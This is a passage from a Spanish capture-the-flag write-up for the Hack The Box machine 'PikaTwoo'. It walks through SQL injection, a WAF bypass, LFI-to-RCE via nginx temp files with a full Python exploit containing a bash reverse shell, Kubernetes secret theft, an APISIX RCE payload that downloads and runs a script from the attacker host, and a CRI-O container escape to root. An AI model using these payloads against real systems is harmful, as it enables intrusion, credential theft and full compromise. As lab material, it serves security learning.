La cabecera ```authorization``` contiene data en base64 que no es legible. En total tiene 256 caracteres

```null
echo fQVUwT9xgVBKSldjchQd/xdxyf0R3Sl/TnbhFG1j+qdbcbV+gmgv9PAHRCXWXLYn8masiYiUUgEG1DQvmkIFAHge8Ui74y+59d80i/gfm1z1hYyIg5pFcbTR/Xvgu1VqdAOmkd27W061BElQRksaoS8d0Oah+4Onb2GAbkBknBbY/+gQGWY7icCTmh5DXX/q6QT3Z/dPG2ggcFoPHUBkjNiV22IclczKcOHAONlKTyXs+/sshEiCygsn8wlRHoPf/SNdV9VYnqUyiS4AsTCe39eGa/aZ1IH3lxRJXeeq7wow9nv7wUGQLEEpe0uXpm5cu/IlozEv4x6IZoW5z0hsTA== | base64 -d | wc -c
256
```

En los archivos del APK se encuentra una clave pública y una clave privada

```null
find . | grep pem
./burp.pem
./pokatmon-app/assets/flutter_assets/keys/private.pem
./pokatmon-app/assets/flutter_assets/keys/public.pem
```

Utilizo ```ChatGPT``` para obtener la forma de firmar mi propio authorization

<img src="/writeups/assets/img/PikaTwoo-htb/19.png" alt="">

Ahora puedo modificar los datos y probar inyecciones. Introduzco una comilla en el correo para ver si se produce un error en la respuesta

```null
openssl dgst -sha256 -sign pokatmon-app/assets/flutter_assets/keys/private.pem <( echo -n "app_beta_mailaddr=rubbx'&app_beta_code=1234567890") | base64 -w 0
DfprRvn7ISDpUPKQ5kQNezMMl2SVnNZNubD//P8WqLtZksb7IjECo4u3Q2TpDjdb8h7+HkHKO4BqwtOoMlXQue6yZWN9dWI2Qtv/XvoDxPxGDHQizp/EFQIRLdhjx6A3EYpHF5eee3fzRi0W6yLUa8vQw498FKFdXzzpLpciUayUljiEiu+s8eDSHaS7QKzUARvR04mRXIfDo3U2gohErUsusYyapYFGIoIn6j0vPFZQVYOwYNaR9J0ieILQZ1mRPectkHMaNNjQULSvy6KEwESWLpjTO3uSMau0cGgQjC/NOyzm2zNIiOYw0mwe5BcfWreB6DePzuHqRpx7Lcgt6g==
```

Es vulnerable a inyección SQL

```null
HTTP/1.1 500 INTERNAL SERVER ERROR
Date: Mon, 18 Sep 2023 17:45:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 290
Connection: close
Server: APISIX/2.10.1
X-APISIX-Upstream-Status: 500

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Con un ```rubbx' or 1=1-- -``` obtengo un correo con su respectivo código

```null
HTTP/1.1 200 OK
Date: Mon, 18 Sep 2023 17:47:22 GMT
Content-Type: application/json
Content-Length: 100
Connection: close
Server: APISIX/2.10.1

{"success":[{"code":"AX3YB-TH9L0-Z1HC5-22EYB-XHLK1-J3WJ67","email":"roger.foster37@freemail.htb"}]}
```

Vuelvo al ```Android``` e intento iniciar sesión en la App. Me redirije a un subdominio nuevo

<img src="/writeups/assets/img/PikaTwoo-htb/20.png" alt="">

Lo añado al ```/etc/hosts``` de mi máquina Linux. Lo más probable es que corresponda a la misma interfaz que hay desde la web. Como ya tengo un ```email``` puedo tratar de resetear la contraseña como ya había visto en ```/forgot```

<img src="/writeups/assets/img/PikaTwoo-htb/21.png" alt="">

Sin embargo, al interceptar el email no aparece en ningún sitio

```null
GET /forgot? HTTP/1.1
Host: www.pokatmon-app.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.pokatmon-app.htb/forgot?
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: W/"943-fi30rwsLZ4S6RaFA9tqDgdMaUDU"
Connection: close
```

Pero no está del todo funcional, así que fuzzeo por nuevas rutas en el puerto 80

```null
gobuster dir -u http://www.pokatmon-app.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.pokatmon-app.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/18 18:52:33 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 3340]
/docs                 (Status: 301) [Size: 175] [--> /docs/]
/welcome              (Status: 302) [Size: 28] [--> /login]
/artwork              (Status: 301) [Size: 181] [--> /artwork/]
/forgot               (Status: 200) [Size: 2371]
/password-reset       (Status: 403) [Size: 21]
Progress: 26433 / 26585 (99.43%)
===============================================================
2023/09/18 18:53:31 Finished
===============================================================
```

Le tramito una petición por GET a ```/password-reset```

```null
curl -s -X GET http://www.pokatmon-app.htb/password-reset
unknown email address
```

Aquí si que puedo poner el email sin problema

```null
GET /password-reset?email=roger.foster37@freemail.htb HTTP/1.1
Host: www.pokatmon-app.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```null
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 18 Sep 2023 18:55:05 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"6a-rBNa87rL/0J+eVfsL14RwpZXowo"
Content-Length: 106

Check your email and change your password 2ca9d49993c191e9a97791eafc5b5d6c44fc660fadcfbe67363658989588fe9f
```

El último valor parece un token, si cambio la petición a POST. Puedo comprobarlo cambiando la petición a POST y mirando la respuesta

```null
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0
Date: Mon, 18 Sep 2023 19:49:18 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"1e-F0oTUf2zSZOGOekUkbWNqkGagIs"
Content-Length: 30

invalid email address or token
```

Sin embargo, no tengo forma de cambiar la contraseña desde aqui. En ningún error se muestra otro parámetro u endpoint que me sirva, así que hay que enumerar más. Encuentro un plugin relacionado con ```Apache APISIX```

<img src="/writeups/assets/img/PikaTwoo-htb/22.png" alt="">

Esto permite abusar de las versiones inferiores a la 2.10.2 (En este caso se emplea la 2.10.1, se puede ver en las cabeceras de respuesta) para bypassear resticciones de rutas a las que no se debería tener accesso. En el ejemplo que dan introducen una ```/``` pero en este caso no aplica. Sin embargo, al url-encodear el primer caracter, la respuesta cambia

```null
curl -s -X GET 'https://www.pokatmon-app.htb/private/' -k
{"error_msg":"access is not allowed"}
```

```null
curl -s -X GET 'https://www.pokatmon-app.htb/%70rivate/' -k
{"error_msg":"404 Route Not Found"}
```

```null
wfuzz -c --hc=403,404 -t 50 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 'https://www.pokatmon-app.htb/%70rivate/FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://www.pokatmon-app.htb/%70rivate/FUZZ
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000039:   405        4 L      23 W       178 Ch      "login"                                                                                                                                         
000023284:   200        1 L      2 W        43 Ch       "password-reset"                                                                                                                                

Total time: 0
Processed Requests: 26535
Filtered Requests: 26533
Requests/sec.: 0
```

La ruta ```password-reset``` devuelve un código de estado 200. Le tramito una petición por GET y aparece un panel de ayuda

```null
curl -s -X GET 'https://www.pokatmon-app.htb/%70rivate/password-reset' -k | jq
{
  "error": "usage: /password-reset/<email>"
}
```

Introduzco el email y me genera de nuevo un token

```null
curl -s -X GET 'https://www.pokatmon-app.htb/%70rivate/password-reset/roger.foster37@freemail.htb' -k | jq
{
  "token": "50ac15ef6ba60a04b4181c8bd6ff42299afdeb9daaa752c1fa3024e9b6978f20"
}
```

Al cambiar la petición a POST, solicita el token

```null
curl -s -X POST 'https://www.pokatmon-app.htb/%70rivate/password-reset/roger.foster37@freemail.htb' -k | jq
{
  "error": "missing parameter token"
}
```

Y, finalmente, el parámetro para la nueva contraseña

```null
curl -s -X POST 'https://www.pokatmon-app.htb/%70rivate/password-reset/roger.foster37@freemail.htb' -k -d 'token=c501152926570745d06bd44a37054a463e4a8c788154418b5d37de81f85c4177' | jq
{
  "error": "missing parameter new_password"
}
```

Creo una nueva y me loggeo desde la web

```null
curl -s -X POST 'https://www.pokatmon-app.htb/%70rivate/password-reset/roger.foster37@freemail.htb' -k -d 'token=c501152926570745d06bd44a37054a463e4a8c788154418b5d37de81f85c4177&new_password=rubbx123' | jq
{
  "success": "password changed"
}
```

Gano acceso a los Docs de una API

<img src="/writeups/assets/img/PikaTwoo-htb/23.png" alt="">

Añado el subdominio ```pokatdex-api-v1.pokatmon-app.htb``` al ```/etc/hosts```. Encuentro una función que permite obtener los datos de una región

<img src="/writeups/assets/img/PikaTwoo-htb/24.png" alt="">

Puedo habilitar el ```debug```

```null
curl -s -X GET 'http://pokatdex-api-v1.pokatmon-app.htb/?region=test&debug=true' -H 'accept: application/json'
{"error": "unknown region", "debug": include(): Failed opening 'regions/test' for inclusion (include_path='.:/usr/share/php')"}
```

Se está tratando de abrir un un archivo, así que pruebo un LFI, pero devuelve ```Forbbiden```

```null
curl -s -X GET 'http://pokatdex-api-v1.pokatmon-app.htb/?region=../../../../../../../../../etc/passwd' -H 'accept: application/json' -x http://localhost:8080
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Puede que se esté empleando algún tipo de WAF. Con ```chatgpt``` busco cuál es el más empleado

<img src="/writeups/assets/img/PikaTwoo-htb/25.png" alt="">

Encuentro un CVE en [cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35368) del que puedo abusar

<img src="/writeups/assets/img/PikaTwoo-htb/26.png" alt="">

En el primer enlace de las referencias explican como abusar de este

<img src="/writeups/assets/img/PikaTwoo-htb/27.png" alt="">

La vulnerabilidad está relacionada con la falta de omisión adecuada en las reglas de Drupal y la desactivación del escaneo del cuerpo de la solicitud. Más adelante comparten un archivo que en caso de ser elimininado manualmente se corrige el fallo

<img src="/writeups/assets/img/PikaTwoo-htb/28.png" alt="">

<img src="/writeups/assets/img/PikaTwoo-htb/28.png" alt="">

Desde el [repositorio oficial](https://github.com/coreruleset/coreruleset), se puede ver el commit donde realizan el parcheo. Para ajustarme a la versión, cambio el branch al ```v3.3/dev```. Busco por el archivo ```REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf```

<img src="/writeups/assets/img/PikaTwoo-htb/29.png" alt="">

Al abrirlo me permite ver los cambios

<img src="/writeups/assets/img/PikaTwoo-htb/30.png" alt="">

Y en uno de ellos solucionan el CVE

<img src="/writeups/assets/img/PikaTwoo-htb/31.png" alt="">

Para ver el archivo en modificar, abro el commit anterior

<img src="/writeups/assets/img/PikaTwoo-htb/32.png" alt="">

Busco por la palabra ```body``` que mencionaban en el CVE. Al cambiar el método a POST, la validación no se aplica correctamente y toma como ruta ```/admin/content/assets/manage/``` seguido de data, teniendo en cuenta que hay que crear una cookie, únicamente para validar las regex

<img src="/writeups/assets/img/PikaTwoo-htb/33.png" alt="">

Consigo un LFI

```null
curl -s -X POST 'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/test' -d 'region=../../../../../../etc/passwd&debug=true' -H 'Cookie: SESS0=a'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
www:x:1000:1000::/home/www:/bin/sh
```

Existe una forma de ejecutar comandos abusdando de la escritura de archivos temporales, más conocido como [LFI2RCE via Nginx temp files](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files).

<img src="/writeups/assets/img/PikaTwoo-htb/34.png" alt="">

Voy a utilizar el script del ejemplo, pero con algunas modificaciones. Obtengo manualmente el número de procesadores que tiene asignados la máquina

```null
curl -s -X POST 'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/test' -d 'region=../../../../../../proc/cpuinfo&debug=true' -H 'Cookie: SESS0=a' | grep processor | wc -l
2
```

Lo mismo para el PID máximo

```null
curl -s -X POST 'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/test' -d 'region=../../../../../../proc/sys/kernel/pid_max' -H 'Cookie: SESS0=a'
4194304
```

En el script cambio estos datos y modifico la petición para que sea por POST, arrastrando las cabeceras y parámetros correspondientes e indico el comando en PHP que quiero ejecutar

```py
#!/usr/bin/env python3
import threading, requests

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/test'
cpus = 2
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESS0": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='pwned\n<?php system("bash -c \'bash -i >& /dev/tcp/10.10.16.58/443 0>&1\'"); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESS0": "a"})
            if r.text and "pwned" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

Gano acceso al sistema como el usuario ```wwww```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.10.11.199] 47970
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ export TERM=xterm-color
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ export SHELL=bash
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ stty rows 55 columns 209
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ source /etc/skel/.bashrc 
```

Estoy dentro de un contenedor

```null
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ hostname -I
10.244.0.8 
```

Dentro de ```/run/secrets/kubernetes.io/serviceaccount``` se encuentran datos de interés de kubernetes, como tokens o nombres de pods

```null
www@pokatdex-api-75b7bd96f7-2xkxk:/run/secrets/kubernetes.io/serviceaccount$ ls
ca.crt  namespace  token
```

```null
www@pokatdex-api-75b7bd96f7-2xkxk:/$ cat /run/secrets/kubernetes.io/serviceaccount/token; echo
eyJhbGciOiJSUzI1NiIsImtpZCI6IjAtelk2WTBKaFgwY3g0b3hxbVF6OWg5blJmNkVOS0xiNFhkNklqN2ZybGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI2Njc5Mzc2LCJpYXQiOjE2OTUxNDMzNzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhcHBsaWNhdGlvbnMiLCJwb2QiOnsibmFtZSI6InBva2F0ZGV4LWFwaS03NWI3YmQ5NmY3LTJ4a3hrIiwidWlkIjoiOGI3MGY1YjItODE1OC00NDg5LTk0NGUtMDA2ZTM1Yzc2ZDkzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMTRmN2QyM2MtZDlmZi00OGE1LTg1MmItODAyZTdjZmVjZDkzIn0sIndhcm5hZnRlciI6MTY5NTE0Njk4M30sIm5iZiI6MTY5NTE0MzM3Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmFwcGxpY2F0aW9uczpkZWZhdWx0In0.AEG4Lkr7U5awNtE-WrIXTqCkaY5VGYXm0cbOt9pndbqJiIiXJw88q4h7oYzCP1KUQQp2N20oZ_X5v7umGIxAOkNrJ12I1VRrv9RRbZvSa6rt2siYPY029nhW7RwUSIMc65aVa8buBhQ4ERy0zlp7LcNBpjpUAzv005UleWctchkhOWgaEc28YdzbwKwzfO4Mcfhr02yJC5SDi7dzKYqPqte_fmhKLxK4sZ94MFQnfjppOgMESWfDsl1L_gqEhHUBI2j04rM56wClmFQlaEQ3y_5HD6n1g5J2jiYYBzOZXetxEZFtQjZpwOQeeZ3xV43l-wutPipiRcbBi_MttQ4ixg
```

Siguiendo este [artículo](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/) puedo conectarme a la API proporcionando ciertos datos

```null
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ APISERVER=https://kubernetes.default.svc
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ TOKEN=$(cat ${SERVICEACCOUNT}/token)
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ CACERT=${SERVICEACCOUNT}/ca.crt
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.49.2:8443"
    }
  ]
```

Al no haberse producido ningún error, intento traer los secretos. Esto devuelve un output muy grande que no voy a añadir todo. Lo importante son las credenciales de ```apisix```

```null
www@pokatdex-api-75b7bd96f7-2xkxk:/tmp$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/applications/secrets
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2411518"
  },
  "items": [
    {
      "metadata": {
        "name": "apisix-credentials",
        "namespace": "applications",
        "uid": "be010bfa-acfb-410b-a5a3-23a2be554642",
        "resourceVersion": "806",
        "creationTimestamp": "2022-03-17T22:02:57Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"APISIX_ADMIN_KEY\":\"YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=\",\"APISIX_VIEWER_KEY\":\"OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"apisix-credentials\",\"namespace\":\"applications\"},\"type\":\"Opaque\"}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-17T22:02:57Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:APISIX_ADMIN_KEY": {},
                "f:APISIX_VIEWER_KEY": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
        "APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="
      },
      "type": "Opaque"
    },

...
```

Al buscar por ```Apisix RCE``` encuentro un exploit para esta versión

<img src="/writeups/assets/img/PikaTwoo-htb/35.png" alt="">

Se trata del [CVE-2022-24112]. En vez de utilizar el script en python del POC, lo hago de forma manual. Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.77/443 0>&1'
```

Lo comparto con python, y, siguiendo la guía lo cargo en el servidor

```null
curl -sk -H "Content-Type: application/json" -X POST "https://10.10.11.199/apisix/batch-requests" -d '{"headers": {"X-API-KEY": "a8c2ef5bcc376e991af0b24da29c3a87"}, "timeout": 1500, "pipeline": [{"path": "/apisix/admin/routes/index", "method": "PUT", "body": "{\"uri\":\"/shell/rubbx\",\"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"127.0.0.1\":1}},\"name\":\"shell\",\"filter_func\":\"function(vars) os.execute(\\\"curl http://10.10.16.77/ -o /tmp/rubbx; bash /tmp/rubbx\\\"); return true end\"}"}]}' | jq .
[
  {
    "headers": {
      "Access-Control-Max-Age": "3600",
      "Access-Control-Allow-Credentials": "true",
      "Server": "APISIX/2.10.1",
      "Content-Type": "application/json",
      "Access-Control-Expose-Headers": "*",
      "Transfer-Encoding": "chunked",
      "Access-Control-Allow-Origin": "*",
      "Connection": "close",
      "Date": "Fri, 22 Sep 2023 16:57:22 GMT"
    },
    "reason": "Created",
    "status": 201,
    "body": "{\"node\":{\"value\":{\"upstream\":{\"nodes\":{\"127.0.0.1\":1},\"type\":\"roundrobin\",\"hash_on\":\"vars\",\"scheme\":\"http\",\"pass_host\":\"pass\"},\"id\":\"index\",\"update_time\":1695401842,\"priority\":0,\"create_time\":1695401842,\"filter_func\":\"function(vars) os.execute(\\\"curl http:\\/\\/10.10.16.77\\/ -o \\/tmp\\/rubbx; bash \\/tmp\\/rubbx\\\"); return true end\",\"uri\":\"\\/shell\\/rubbx\",\"status\":1,\"name\":\"shell\"},\"key\":\"\\/apisix\\/routes\\/index\"},\"action\":\"set\"}\n"
  }
```

Para ejecutarlo, lo cargo desde el endpoint que indiqué

```null
curl https://10.10.11.199/shell/rubbx -k
```

Gano acceso al sistema

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.77] from (UNKNOWN) [10.10.11.199] 33514
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-5.1$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.1$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
bash-5.1$ export TERM=xterm-color
bash-5.1$ export SHELL=bash
bash-5.1$ stty rows 55 columns 209
```

Encuentro credenciales hardcodeadas para un usuario por SSH

```null
bash-5.1$ cat conf/config.yaml 

...
discovery:
  eureka:
    fetch_interval: 30
    host:
    - http://andrew:st41rw4y2h34v3n@evolution.pokatmon.htb:8888
    prefix: /eureka/
    timeout:
      connect: 2000
      read: 5000
      send: 2000
    weight: 100
...
```

Gano acceso al sistema y puedo ver la primera flag

```null
ssh andrew@10.10.11.199
The authenticity of host '10.10.11.199 (10.10.11.199)' can't be established.
ED25519 key fingerprint is SHA256:rmoKwjIaPE8JsFR4KglXMzWTko/1/8TgsbS+3UOi1Rk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.199' (ED25519) to the list of known hosts.
andrew@10.10.11.199's password: 
Linux pikatwoo.pokatmon.htb 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 17 15:37:02 2023 from 10.10.14.13
andrew@pikatwoo:~$ cat user.txt 
149c6e91373c5a1737edda04d0246e9f
```

# Escalada

Subo a la máquina ```kubectl``` para enumerar ```Kubernetes```. Primero lo descargo a mi equipo

```null
curl -LO https://dl.k8s.io/release/v1.28.2/bin/linux/amd64/kubectl
```

Y después lo transfiero

```null
ndrew@pikatwoo:/tmp$ wget http://10.10.16.77/kubectl
--2023-09-22 18:10:43--  http://10.10.16.77/kubectl
Connecting to 10.10.16.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 49864704 (48M) [application/octet-stream]
Saving to: ‘kubectl’

kubectl                                              100%[===================================================================================================================>]  47.55M  3.57MB/s    in 20s     

2023-09-22 18:11:03 (2.41 MB/s) - ‘kubectl’ saved [49864704/49864704]
```

Si intento listar los PODs me devuelve un error

```null
andrew@pikatwoo:/tmp$ ./kubectl get pods
Error from server: the server responded with the status code 412 but did not return more information
```

Esto se debe a que me faltan permisos. Sin embargo, en el directorio personal del usuario ```jenniffer``` se encuentra un archivo de configuración

```null
andrew@pikatwoo:/tmp$ kubectl --kubeconfig /home/jennifer/.kube/config get pods
Error from server (Forbidden): pods is forbidden: User "jennifer" cannot list resource "pods" in API group "" in the namespace "default"
```

Ahora el error cambia, no puedo leer desde ese ```namespace```, pero tengo varios para elegir

```null
andrew@pikatwoo:/tmp$ kubectl --kubeconfig /home/jennifer/.kube/config get namespaces
NAME              STATUS   AGE
applications      Active   553d
default           Active   553d
development       Active   316d
kube-node-lease   Active   553d
kube-public       Active   553d
kube-system       Active   553d
```

Tras probar todos, no logro nada en especial. Si listo los paquetes del sistema, encuentro un complemento de Kubernetes

```null
andrew@pikatwoo:/tmp$ dpkg -l | grep minikube
hi  minikube                                         1.28.0-0                          amd64        Minikube
```




En los logs del usuario ```jennifer``` se puede ver el ```ContainerRuntime``` y ```Driver```. Hace poco se publicó una [vulnerabilidad]((https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)) en la que se toman en cuenta estos tres conceptos

```null
andrew@pikatwoo:/home/jennifer/.minikube/logs$ cat lastStart.txt | grep "Loaded profile"
I0318 10:22:23.839031     443 config.go:176] Loaded profile config "minikube": Driver=podman, ContainerRuntime=crio, KubernetesVersion=v1.23.3
```

Sigo la guía del CVE-2022-0811 para convertirme en el usuario ```root```. Creo un script en bash que se encargue de asignarle el SUID a la bash

```sh
#!/bin/bash

chmod u+s /bin/bash
```

Le asigno permisos de ejecución

```null
andrew@pikatwoo:/dev/shm$ chmod +x pwned.sh 
```

Y copio el ```yaml``` de configuración del POD malicioso para sobrescribir una propiedad del kernel y que se ejecute el script

```yml
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/dev/shm/pwned.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```

Creo el POD

```null
andrew@pikatwoo:/dev/shm$ /tmp/kubectl --kubeconfig /home/jennifer/.kube/config create -f malicious.yml -n development
pod/sysctl-set created
```

Se modifica la configuración del kernel

```null
andrew@pikatwoo:/dev/shm$ cat /proc/sys/kernel/core_pattern 
|/dev/shm/pwned.sh #'
```

Para ejecutar el exploit, ejecuto un comando en segundo plano y borro el PID (Abusando de un ```crash dump```)

```null
andrew@pikatwoo:/dev/shm$ tail -f /dev/null &
[1] 554567
andrew@pikatwoo:/dev/shm$ kill -SIGSEGV 554567
```

La bash se convierte en SUID

```null
andrew@pikatwoo:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
[1]+  Segmentation fault      (core dumped) tail -f /dev/null
```

Puedo ver la segunda flag

```null
andrew@pikatwoo:/dev/shm$ bash -p
bash-5.1# cat /root/root.txt 
a9e820e630aa64ccd2fda370907c74c6
```